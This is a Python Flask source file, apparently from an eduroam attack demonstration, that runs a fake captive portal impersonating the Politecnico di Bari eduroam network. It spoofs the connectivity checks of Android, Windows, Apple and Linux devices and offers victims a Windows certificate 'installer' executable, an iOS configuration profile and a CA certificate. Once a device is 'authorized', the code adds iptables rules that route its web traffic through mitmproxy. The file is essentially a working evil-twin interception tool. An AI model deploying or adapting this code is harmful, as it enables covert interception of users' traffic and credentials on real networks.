from flask import Flask, request, redirect, render_template_string, send_from_directory
import subprocess, os, logging, time

app = Flask(__name__)

# Set of authorized IPs (in memory)
authenticated_ips = set()

# Definitions for mitmproxy and wlan0 interface
MITMPROXY_PORT = "8080" # Port on which mitmproxy is listening
HOTSPOT_INTERFACE = "wlan0" # wlan0 interface, must match $HOTSPOT_IFACE in iptables_setup_gemini.sh

# HTML captive portal
with open("/opt/demo_attack_eduroam/html/captive_portal.html", "r") as f:
    CAPTIVE_PORTAL_HTML = f.read()

# HTML captive portal android
with open("/opt/demo_attack_eduroam/html/captive_portal_android.html", "r") as f:
    CAPTIVE_PORTAL_HTML_ANDROID = f.read()

# HTML captive portal windows
with open("/opt/demo_attack_eduroam/html/captive_portal_windows.html", "r") as f:
    CAPTIVE_PORTAL_HTML_WINDOWS = f.read()

# HTML captive portal apple
with open("/opt/demo_attack_eduroam/html/captive_portal_apple.html", "r") as f:
    CAPTIVE_PORTAL_HTML_APPLE = f.read()

# HTML captive portal linux
with open("/opt/demo_attack_eduroam/html/captive_portal_linux.html", "r") as f:
    CAPTIVE_PORTAL_HTML_LINUX = f.read()

# Access confirmation page
with open("/opt/demo_attack_eduroam/html/success.html", "r") as f:
    CONFIRMATION_PAGE = f.read()

# Defining function to manage authN ip process
def is_authenticated(ip):
    return ip in authenticated_ips

# Defining function to manage authZ ip process (not for Android)
def authorize_ip(ip):
    if ip not in authenticated_ips:
        authenticated_ips.add(ip)
        mac = ottieni_mac(ip)
        if mac:
            aggiorna_dhcp_hosts(mac, ip)
        else:
            logging.warning(f"[!] MAC address not found for {ip}. Cannot update dhcp-hosts.conf.")

        # IPTABLES rules to redirect authorized IP traffic to mitmproxy and allow DNS traffic
        regole = [
            # Allow DNS forwarding for the authorized IP. (FORWARD chain default = DROP)
            ["sudo", "iptables", "-I", "FORWARD", "-i", HOTSPOT_INTERFACE, "-s", ip, "-p", "udp", "--dport", "53", "-j", "ACCEPT"], 
            ["sudo", "iptables", "-I", "FORWARD", "-i", HOTSPOT_INTERFACE, "-s", ip, "-p", "tcp", "--dport", "53", "-j", "ACCEPT"],

            # Redirect HTTP (port 80) and HTTPS (port 443) traffic from the authorized IP to the mitmproxy port on the local machine
            ["sudo", "iptables", "-t", "nat", "-I", "PREROUTING", "-i", HOTSPOT_INTERFACE, "-s", ip, "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", MITMPROXY_PORT], 
            ["sudo", "iptables", "-t", "nat", "-I", "PREROUTING", "-i", HOTSPOT_INTERFACE, "-s", ip, "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", MITMPROXY_PORT],
        ]

        # To permit the download of the Eduroam logo before activating new iptables rules
        time.sleep(3)

        # Loop over the array to insert the rules 
        for regola in regole:
            try:
                subprocess.run(regola, check=True)
                logging.info(f"[+] IPTABLES rule executed: {' '.join(regola)}")
            except subprocess.CalledProcessError as e:
                logging.error(f"[!] Error executing IPTABLES: {e} - Command: {' '.join(regola)}")
            except FileNotFoundError:
                logging.error(f"[!] Error: Command '{regola[0]}' not found. Make sure iptables is installed and in PATH.")
        
        logging.info(f"[+] IP {ip} authorized and traffic redirected to mitmproxy on port {MITMPROXY_PORT}")
        
# Defining function to manage authZ ip process (only for Android and Linux Distribution)
def authorize_ip_android_linux(ip):
    if ip not in authenticated_ips:
        authenticated_ips.add(ip)
        mac = ottieni_mac(ip)
        if mac:
            aggiorna_dhcp_hosts(mac, ip)
        else:
            logging.warning(f"[!] MAC address not found for {ip}. Cannot update dhcp-hosts.conf.")

        regole = [
            
            # Allow all traffic forwarding for the authorized ip (FORWARD chain default = DROP)
            ["sudo", "iptables", "-I", "FORWARD", "-i", HOTSPOT_INTERFACE, "-s", ip, "-j", "ACCEPT"],

            # Allow authorized user traffic to skip captive portal PREROUTING rules.
            ["sudo", "iptables", "-t", "nat", "-I", "PREROUTING", "-i", HOTSPOT_INTERFACE, "-s", ip, "-p", "tcp", "--dport", "80", "-j", "RETURN"],
            ["sudo", "iptables", "-t", "nat", "-I", "PREROUTING", "-i", HOTSPOT_INTERFACE, "-s", ip, "-p", "tcp", "--dport", "443", "-j", "RETURN"],
            
        ]
        
        # To permit the download of the Eduroam logo before activating new iptables rules
        time.sleep(3)

        # Loop over the array to insert the rules 
        for regola in regole:
            try:
                subprocess.run(regola, check=True)
                logging.info(f"[+] IPTABLES rule executed: {' '.join(regola)}")
            except subprocess.CalledProcessError as e:
                logging.error(f"[!] Error executing IPTABLES: {e} - Command: {' '.join(regola)}")
            except FileNotFoundError:
                logging.error(f"[!] Error: Command '{regola[0]}' not found. Make sure iptables is installed and in PATH.")
        
        logging.info(f"[+] IP {ip} authorized and traffic redirected to mitmproxy on port {MITMPROXY_PORT}")


# Obtain mac address parsing the ARP cache
def ottieni_mac(ip):
    try:
        # Get the ARP cache
        output = subprocess.check_output(["sudo", "arp", "-n", ip], encoding="utf-8", timeout=5)
        # Parse ARP cache
        for riga in output.splitlines():
            if ip in riga:
                # The MAC address column is the third (index 2)
                mac_address = riga.split()[2]
                if mac_address != "(incomplete)": # Added handling for incomplete MACs
                    return mac_address
        logging.warning(f"MAC address not found in ARP cache for {ip} or incomplete.")
    except subprocess.CalledProcessError as e:
        logging.error(f"[!] ARP Error: {e} - Command: arp -n {ip}")
    except subprocess.TimeoutExpired:
        logging.error(f"[!] Timeout getting MAC address for {ip}.")
    except FileNotFoundError:
        logging.error(f"[!] Error: Command 'arp' not found. Make sure net-tools is installed.")
    except Exception as e:
        logging.error(f"[!] Generic error in ottieni_mac: {e}")
    return None

# Adds MAC and IP with 'auth' tag to dhcp-hosts.conf file and reloads dnsmasq
def aggiorna_dhcp_hosts(mac, ip):
    dhcp_hosts_path = "/opt/demo_attack_eduroam/dnsmasq/dhcp-hosts.conf" 
    nuova_riga = f"{mac},set:auth\n" 
    try:
        with open(dhcp_hosts_path, "a+") as f:
            f.seek(0) 
            righe = f.readlines()
            mac_tag_presente = False
            for riga_esistente in righe:
                if riga_esistente.startswith(f"{mac},") and "set:auth" in riga_esistente: 
                    mac_tag_presente = True
                    break

            if not mac_tag_presente:
                f.write(nuova_riga)
                logging.info(f"[+] Added {mac} with 'auth' tag to dhcp-hosts.conf")
            else:
                logging.info(f"[i] {mac} with 'auth' tag already present in dhcp-hosts.conf")
    except Exception as e:
        logging.error(f"[!] Error writing dhcp-hosts.conf: {e}")
        return

    try:
        # Reload of dnsmasq
        subprocess.run(["sudo", "pkill", "-HUP", "dnsmasq"], check=True)
        logging.info("[+] dnsmasq reloaded")
    except subprocess.CalledProcessError as e:
        logging.error(f"[!] Error reloading dnsmasq: {e}")
    except FileNotFoundError:
        logging.error(f"[!] Error: Command 'pkill' not found.")
    except Exception as e:
        logging.error(f"[!] Generic error reloading dnsmasq: {e}")

# Management of the HTTP Request for the Eduroam Logo
@app.route('/eduroam-logo.png', methods=['GET'])
def serve_eduroam_logo():
    print("DEBUG: Request received for /eduroam-logo.png") 
    try:
        # Check if the file exists before trying to serve it
        file_path = os.path.join('/opt/demo_attack_eduroam/html/src/eduroam-logo.png')
        if not os.path.exists(file_path):
            print(f"DEBUG: File not found at path: {file_path}") 
            return "File not found", 404
                
        print(f"DEBUG: Attempting to serve file: {file_path}") 
        return send_from_directory('/opt/demo_attack_eduroam/html/src' ,'eduroam-logo.png')
    except FileNotFoundError: # Even if we checked before, keep it for safety
        print("DEBUG: FileNotFoundError exception caught.")  
        return "File not found", 404
    except Exception as e:
        print(f"DEBUG: General exception caught: {type(e).__name__} - {e}") 
        import traceback
        traceback.print_exc() # Print full traceback to console
        return "Internal server error", 500

# Management of the HTTP Request of the certificate installer for Windows
@app.route('/cert_installer_windows', methods=['GET'])
def serve_eseguibili_windows():
    print("DEBUG: Request received for /cert_installer_windows.exe") 
    try:
        # Check if the file exists before trying to serve it
        file_path = os.path.join('/opt/demo_attack_eduroam/html/src/cert_installer_windows.exe')
        if not os.path.exists(file_path):
            print(f"DEBUG: File not found at path: {file_path}") 
            return "File not found", 404
                
        print(f"DEBUG: Attempting to serve file: {file_path}") 
        return send_from_directory('/opt/demo_attack_eduroam/html/src' ,'cert_installer_windows.exe')
    except FileNotFoundError: # Even if we checked before, keep it for safety
        print("DEBUG: FileNotFoundError exception caught.") 
        return "File not found", 404
    except Exception as e:
        print(f"DEBUG: General exception caught: {type(e).__name__} - {e}") 
        import traceback
        traceback.print_exc() # Print full traceback to console
        return "Internal server error", 500


# Management of the HTTP Request of the certificate installer for HarmonyOS
@app.route('/certificate_harmonyOS', methods=['GET'])
def serve_eduroam_certificate_harmonyos():
    print("DEBUG: Request received for /poliba_ca.crt") 
    try:
        # Check if the file exists before trying to serve it
        file_path = os.path.join('/opt/demo_attack_eduroam/html/src/poliba_ca.crt')
        if not os.path.exists(file_path):
            print(f"DEBUG: File not found at path: {file_path}") 
            return "File not found", 404
                
        print(f"DEBUG: Attempting to serve file: {file_path}") 
        return send_from_directory('/opt/demo_attack_eduroam/html/src', 'poliba_ca.crt')
    except FileNotFoundError: # Even if we checked before, keep it for safety
        print("DEBUG: FileNotFoundError exception caught.") 
        return "File not found", 404
    except Exception as e:
        print(f"DEBUG: General exception caught: {type(e).__name__} - {e}") 
        import traceback
        traceback.print_exc() # Print full traceback to console
        return "Internal server error", 500

# Management of the HTTP Request of the certificate installer for iOS
@app.route('/certificate_iOS', methods=['GET'])
def serve_eduroam_certificate_ios():
    print("DEBUG: Request received for /certificate_iOS") 
    try:
        # Check if the file exists before trying to serve it
        file_path = os.path.join('/opt/demo_attack_eduroam/html/src/eduroam-poliba.mobileconfig')
        if not os.path.exists(file_path):
            print(f"DEBUG: File not found at path: {file_path}") 
            return "File not found", 404
                
        print(f"DEBUG: Attempting to serve file: {file_path}") 
        return send_from_directory('/opt/demo_attack_eduroam/html/src', 'eduroam-poliba.mobileconfig')
    except FileNotFoundError: # Even if we checked before, keep it for safety
        print("DEBUG: FileNotFoundError exception caught.") 
        return "File not found", 404
    except Exception as e:
        print(f"DEBUG: General exception caught: {type(e).__name__} - {e}") 
        import traceback
        traceback.print_exc() # Print full traceback to console
        return "Internal server error", 500




# Management of the HTTP Request for the /android route
@app.route("/android", methods=["GET"])
def index_android():
    client_ip = request.remote_addr
    if is_authenticated(client_ip):
        return redirect("https://www.poliba.it")
    return render_template_string(CAPTIVE_PORTAL_HTML_ANDROID)

# Management of the HTTP Request for the /windows route
@app.route("/windows", methods=["GET"])
def index_windows():
    client_ip = request.remote_addr
    if is_authenticated(client_ip):
        return redirect("https://www.poliba.it")
    return render_template_string(CAPTIVE_PORTAL_HTML_WINDOWS)

# Management of the HTTP Request for the /apple route
@app.route("/apple", methods=["GET"])
def index_apple():
    client_ip = request.remote_addr
    if is_authenticated(client_ip):
        return redirect("https://www.poliba.it")
    return render_template_string(CAPTIVE_PORTAL_HTML_APPLE)

# Management of the HTTP Request for the /linux route
@app.route("/linux", methods=["GET"])
def index_linux():
    client_ip = request.remote_addr
    if is_authenticated(client_ip):
        return redirect("https://www.poliba.it")
    return render_template_string(CAPTIVE_PORTAL_HTML_LINUX)

# Management of the HTTP Request for the /authorize route
@app.route("/authorize", methods=["POST"])
def authorize():
    client_ip = request.remote_addr
    authorize_ip(client_ip)
    return render_template_string(CONFIRMATION_PAGE)

# Management of the HTTP Request for the /authorize_android route
@app.route("/authorize_android_linux", methods=["POST"])
def authorize_android_linux():
    client_ip = request.remote_addr
    authorize_ip_android_linux(client_ip)
    return render_template_string(CONFIRMATION_PAGE)

# Management of the Captive Portal Detection Request for Android
@app.route("/generate_204")
@app.route("/gen_204")
@app.route("/generate204")
def android_check():
    client_ip = request.remote_addr
    if is_authenticated(client_ip):
        return ('', 204) 
    else:
        return redirect("http://eduroam.poliba.it/android") #

# Management of the Captive Portal Detection Request for Windows
@app.route("/redirect")
@app.route("/connecttest.txt")
def windows_check():
    client_ip = request.remote_addr
    if is_authenticated(client_ip):
        return ('Microsoft Connect Test', 200) 
    else:
        return redirect("http://eduroam.poliba.it/windows") #


# Management of the Captive Portal Detection Request for iOS
@app.route("/hotspot-detect.html")
def apple_check():
    client_ip = request.remote_addr
    if is_authenticated(client_ip):
        return ('Success', 200)
    else:
        return redirect("http://eduroam.poliba.it/apple") #

# Management of the Captive Portal Detection Request for Linux
@app.route("/success.txt?ipv4")
@app.route("/success.txt")
@app.route("/check_network_status.txt")
@app.route("/canonical.html")
def linux_check():
    client_ip = request.remote_addr
    if is_authenticated(client_ip):
        return ('NetworkManager is online', 200)
    else:
        return redirect("http://eduroam.poliba.it/linux")
        

# Management of the Captive Portal Detection Request for any other CPD url not explicitly defined
@app.route("/", defaults={"path": ""}, methods=["GET", "POST"])
@app.route("/<path:path>", methods=["GET", "POST"])
def catch_all_routes(path):
    client_ip = request.remote_addr
    logging.info(f"[!] Unhandled request: /{path} from {client_ip}")
    if is_authenticated(client_ip):
        return redirect("https://www.poliba.it")
    return render_template_string(CAPTIVE_PORTAL_HTML)


if __name__ == "__main__":
    logging.info("Starting Flask captive portal server...")
    app.run(host="0.0.0.0", port=80)
